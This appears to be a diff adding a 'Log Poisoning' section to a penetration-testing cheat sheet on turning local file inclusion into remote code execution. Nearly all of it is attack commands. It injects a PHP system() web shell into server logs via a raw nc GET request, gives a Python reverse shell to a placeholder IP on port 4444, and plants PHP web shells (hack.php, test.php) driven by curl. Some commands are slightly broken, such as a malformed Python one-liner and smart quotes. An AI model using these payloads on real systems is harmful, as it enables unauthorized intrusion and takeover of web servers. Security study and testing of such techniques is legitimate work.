@@ -325,8 +325,28 @@ odd characters or double encoded
 
 # **<a name="lfi2rce">LFI to RCE</a>**
 
+## Log Poisoning
 
+Include the following in a GET request and when you view the access.log file it will show the php info verison  
+`/<?php phpinfo(); ?>`  
 
+`$ nc secureapplication.example 80`   
+`GET /<?php system($_GET['cmd']);?>`
+
+`python -c socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+Other variations of php LFI to RCE
+
+`<?php system($_REQUEST['vipertooth']); ?>`      
+save as file named hack.php
+
+`curl 10.10.10.104/hack.php?vipertooth=whoami`
+
+should be limited shell
+
+sudo echo -e “<?=\`\$_POST[vipertooth]\`?>\r<?='PHP Test';?>” > /var/www/html/test.php
+
+`curl localhost/test.php -d vipertooth=whoami`
 
 Referances:
 
